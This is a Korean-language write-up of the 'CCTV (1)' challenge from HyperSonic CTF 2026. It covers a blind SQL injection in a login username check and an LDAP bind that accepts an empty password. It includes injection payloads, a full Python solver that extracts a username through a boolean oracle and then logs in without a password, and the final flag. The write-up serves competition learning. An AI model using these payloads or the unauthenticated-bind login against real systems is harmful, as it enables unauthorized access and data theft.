---
title: "HyperSonic CTF 2026 CCTV (1) Writeup"
published: 2026-06-08
description: "HyperSonic CTF 2026 CCTV (1) 문제 풀이."
category: "CTF/Wargame"
tags: ["HyperSonic CTF", "CTF", "Writeup", "Misc"]
draft: false
listed: false
---

***SSG Writeup***

# CCTV (1)

## 개요

`CCTV (1)`은 HS-CCTV 관리 콘솔에서 일반 사용자 세션을 만든 뒤 대시보드에 표시되는 `Maintenance Token`을 읽는 문제입니다.

- 문제 분류: `misc`
- 점수: `200`
- 설명: `Hack the CCTV.`

제공된 프로그램에는 `local`과 `ldap` 두 가지 로그인 모드가 있습니다. `local` 모드에서는 일반 사용자 이름을 확인하는 SQL 쿼리에 injection이 가능하고, `ldap` 모드에서는 빈 비밀번호로도 바인드가 성공하는 흐름을 확인할 수 있습니다. 풀이에서는 먼저 SQL injection으로 operator 계정 이름을 찾고, 그 이름으로 LDAP 로그인을 시도해 세션을 얻습니다.

## 문제 분석

글에서 사용할 주요 용어를 먼저 정리합니다.

- `users`: 계정 정보를 저장하는 SQLite 테이블입니다.
- `username`: 웹 로그인에 사용하는 계정 이름입니다.
- `role`: 세션에 저장되는 권한 문자열입니다. 일반 사용자는 `user`, 관리자는 `admin`입니다.
- `ldap_dn`: LDAP 바인드에 사용할 DN입니다.
- `SERVICE_TOKEN`: 로그인한 사용자에게 대시보드에서 표시되는 유지보수 토큰입니다.
- `oracle`: SQL 조건의 참과 거짓을 로그인 응답 차이로 판별하는 함수입니다.

시작 스크립트는 `FLAG1` 값을 `CCTV_SERVICE_TOKEN`으로 넘깁니다.

```sh
CCTV_SERVICE_TOKEN="${CCTV_SERVICE_TOKEN:-${FLAG1:-CCTV-MGMT-UNPROVISIONED}}"
```

대시보드 템플릿은 이 값을 `Maintenance Token` 영역에 출력합니다.

```html
<div class="label">Maintenance Token</div>
<div class="value service-token">{{SERVICE_TOKEN}}</div>
```

따라서 `CCTV (1)`의 목표는 관리자 권한이 아니라, 대시보드를 볼 수 있는 사용자 세션입니다.

계정 테이블은 다음 구조입니다.

```sql
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT UNIQUE NOT NULL,
    role TEXT NOT NULL,
    local_password_cipher TEXT NOT NULL,
    ldap_dn TEXT UNIQUE NOT NULL
);
```

또한 RSA 공개 파라미터도 데이터베이스에 저장됩니다.

```sql
CREATE TABLE device_public_params (
    name TEXT PRIMARY KEY,
    value TEXT NOT NULL
);
```

제공된 프로그램 기준으로 로컬 비밀번호 검증은 `e = 65537`인 RSA 연산을 사용합니다. `local_password_cipher`에서 비밀번호를 바로 복구하기는 어렵지만, 이 문제에서는 로컬 비밀번호를 알 필요가 없습니다. 필요한 값은 LDAP 로그인을 시도할 operator의 `username`입니다.

`local` 모드에서 일반 사용자 로그인을 처리할 때, 프로그램은 먼저 아래 쿼리로 `role = 'user'` 계정의 존재 여부를 확인합니다.

```sql
SELECT username FROM users WHERE role = 'user' AND username = '%s' LIMIT 1
```

`username`이 escape 처리 없이 들어가기 때문에 다음 형태의 조건을 삽입할 수 있습니다.

```text
' OR (<condition>) -- -
```

응답은 조건 결과에 따라 달라집니다.

```text
조건이 참인 경우: Password verification failed.
조건이 거짓인 경우: Account not found.
```

조건이 참이면 존재 확인 쿼리가 행을 반환합니다. 이후 프로그램은 payload 전체를 실제 사용자 이름으로 다시 조회하므로 비밀번호 검증 단계에서 실패합니다. 반대로 조건이 거짓이면 계정을 찾지 못했다는 응답이 나옵니다. 이 차이로 `length`, `substr`를 이용해 operator의 `username`을 한 글자씩 읽을 수 있습니다.

LDAP 로그인 흐름도 중요합니다. 프로그램의 흐름을 정리하면 다음과 같습니다.

```text
if mode == "ldap":
    if username == "admin":
        reject

    account = load_account_by_name(username)
    ldap_simple_bind_s(account.ldap_dn, password)

    if bind_success:
        create_session(account.username, account.role)
```

관리자 계정의 LDAP 로그인은 막혀 있지만, 일반 사용자 계정은 `ldap_simple_bind_s` 결과만 보고 로그인 성공 여부를 판단합니다. 여기서 `password`가 빈 비밀번호라도 LDAP 서버가 성공을 반환하면 프로그램은 이를 정상 인증으로 처리하고 `user` 세션을 발급합니다.

## 핵심 아이디어

풀이의 핵심은 `local` 로그인과 `ldap` 로그인을 따로 보는 것입니다.

`local` 로그인은 세션을 얻는 데 쓰지 않습니다. 대신 SQL injection으로 operator의 `username`을 찾는 데만 사용합니다. 데이터베이스의 전체 내용이 직접 출력되지는 않지만, 로그인 실패 메시지가 두 종류로 나뉘기 때문에 충분한 boolean oracle이 됩니다.

그다음 `ldap` 로그인을 사용합니다. LDAP simple bind에서 DN은 존재하지만 비밀번호가 비어 있는 경우, 서버가 익명 바인드로 성공을 돌려줄 수 있습니다. 프로그램은 이 성공 코드를 실제 사용자 인증 성공과 구분하지 않습니다. 그래서 operator 이름만 알고 있으면 빈 비밀번호로도 웹 세션을 만들 수 있습니다.

대시보드는 `role = user` 세션에도 `Maintenance Token`을 렌더링합니다. 관리자 전용 `Supervisor Token`은 보이지 않지만, `CCTV (1)`에서 필요한 값은 `Maintenance Token`이므로 여기까지면 충분합니다.

## 풀이 과정

### Step 1. 대시보드의 토큰 출력 조건 확인

먼저 `Maintenance Token`이 어디에서 나오는지 확인했습니다. 시작 스크립트는 `FLAG1`을 `CCTV_SERVICE_TOKEN`으로 전달하고, 대시보드는 `{{SERVICE_TOKEN}}`을 그대로 출력합니다.

이 단계에서 목표가 정해집니다. 토큰 파일을 직접 읽거나 관리자 계정으로 들어갈 필요는 없습니다. 로그인된 사용자 세션만 있으면 대시보드에서 토큰을 확인할 수 있습니다.

### Step 2. `local` 로그인으로 SQL oracle 구성

일반 사용자에 대한 `local` 로그인은 `username`을 SQL 문자열 안에 그대로 넣습니다. 다음 payload는 첫 글자가 `c`인지 확인하는 예시입니다.

```text
' OR (substr((SELECT username FROM users WHERE role='user' LIMIT 1),1,1)='c') -- -
```

조건이 참이면 `Password verification failed.`가 나오고, 거짓이면 `Account not found.`가 나옵니다. 이 응답 차이를 boolean 값으로 바꾸면 문자열 길이와 각 문자를 순서대로 복구할 수 있습니다.

operator 이름은 `role = 'user'`인 계정의 `username`으로 읽습니다.

```sql
SELECT username FROM users WHERE role='user' LIMIT 1
```

### Step 3. operator 이름으로 LDAP 빈 비밀번호 로그인

이제 복구한 `username`을 `ldap` 모드에 넣습니다. 이때 `password`는 빈 비밀번호로 둡니다.

```text
mode=ldap
username=<operator username>
password=
```

프로그램은 `load_account_by_name`으로 operator의 `ldap_dn`을 채우고, 그 DN과 빈 비밀번호로 `ldap_simple_bind_s`를 호출합니다. 바인드가 성공하면 `create_session`이 호출되고 `CCTVSESSID` 쿠키가 발급됩니다.

이 세션의 `role`은 `user`입니다. `Supervisor Token`은 보이지 않지만, `Maintenance Token`은 일반 사용자 대시보드에도 표시됩니다.

### Step 4. 대시보드에서 `Maintenance Token` 추출

발급받은 세션 쿠키로 대시보드에 접근하면 `Maintenance Token` 영역을 확인할 수 있습니다. 응답 HTML에서 `service-token` 값을 파싱하면 flag가 나옵니다.

## Exploit / Solver

solver의 흐름은 다음과 같습니다.

1. `local` 로그인 응답 차이를 이용해 SQL oracle을 만듭니다.
2. `users` 테이블에서 `role = 'user'`인 `username`을 추출합니다.
3. 추출한 `username`으로 `ldap` 로그인을 시도하되 `password`는 빈 비밀번호로 보냅니다.
4. 발급된 세션으로 대시보드에 접근해 `Maintenance Token`을 찾습니다.

아래 코드는 핵심 루틴만 정리한 것입니다. 대상 주소는 실행 시 인자로 받는다고 가정합니다.

```python
import re
import string
import urllib.parse
import urllib.request
import http.cookiejar


USER_CHARS = string.ascii_letters + string.digits + "_-."


class CCTVClient:
    def __init__(self, base_url):
        self.base = base_url.rstrip("/")
        self.cookies = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.cookies)
        )

    def post_login(self, mode, username, password):
        data = urllib.parse.urlencode({
            "mode": mode,
            "username": username,
            "password": password,
        }).encode()
        req = urllib.request.Request(self.base + "/login", data=data, method="POST")
        return self.opener.open(req, timeout=10)

    def oracle(self, condition):
        payload = "' OR (" + condition + ") -- "
        body = self.post_login("local", payload, "x").read().decode(
            "utf-8",
            errors="ignore",
        )

        if "Password verification failed." in body:
            return True
        if "Account not found." in body:
            return False
        raise RuntimeError("unexpected oracle response")

    def extract_int(self, expr, lo, hi):
        while lo < hi:
            mid = (lo + hi) // 2
            if self.oracle(f"({expr})>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        return lo

    def extract_text(self, expr, alphabet, max_len):
        length = self.extract_int(f"length(({expr}))", 0, max_len)
        out = []

        for pos in range(1, length + 1):
            for ch in alphabet:
                q = ch.replace("'", "''")
                if self.oracle(f"substr(({expr}),{pos},1)='{q}'"):
                    out.append(ch)
                    break
            else:
                raise RuntimeError(f"failed to extract position {pos}")

        return "".join(out)

    def ldap_login(self, username):
        self.post_login("ldap", username, "").read()

    def dashboard(self):
        return self.opener.open(self.base + "/dashboard", timeout=10).read().decode(
            "utf-8",
            errors="ignore",
        )


def solve(base_url):
    client = CCTVClient(base_url)

    username_expr = "SELECT username FROM users WHERE role='user' LIMIT 1"
    username = client.extract_text(username_expr, USER_CHARS, 64)

    client.ldap_login(username)
    html = client.dashboard()

    token = re.search(
        r"Maintenance Token.*?service-token[^>]*>([^<]+)<",
        html,
        re.S,
    )
    if not token:
        raise RuntimeError("maintenance token not found")

    return token.group(1).strip()
```

## 결과

실제 대상에서 SQL oracle로 operator 이름을 복구한 뒤, LDAP 모드에서 빈 비밀번호 로그인을 수행해 사용자 세션을 얻었습니다. 대시보드의 `Maintenance Token`에서 다음 값을 확인했습니다.

```text
HS{Do_you_know_unauthenticated_bind?_https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/41cbdb2c-eab1-45b0-8236-ae777b1c5406}
```
